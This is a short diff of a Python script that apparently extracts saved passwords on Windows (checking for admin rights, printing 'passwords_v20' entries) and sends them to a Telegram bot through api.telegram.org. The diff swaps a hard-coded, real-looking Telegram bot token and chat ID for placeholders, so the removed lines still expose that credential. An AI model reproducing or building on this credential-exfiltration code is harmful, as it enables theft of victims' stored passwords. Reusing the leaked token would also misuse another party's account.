@@ -3,6 +3,10 @@ import ctypes
 import sys
 import time
 
+# Your bot token and chat ID
+BOT_TOKEN = 'bot_token_here'
+CHAT_ID = 'chat_id_here'
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -140,10 +144,6 @@ for p in passwords_v20:
     print(f"Password: {password}")
     print("-" * 50)
 
-
-# Your bot token and chat ID
-BOT_TOKEN = '7909854177:AAEuFKww3A1W-ksvR4qBSgWIKtX09ibpGMI'
-CHAT_ID = '6601089119'
 
 def send_telegram_message(message):
     url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
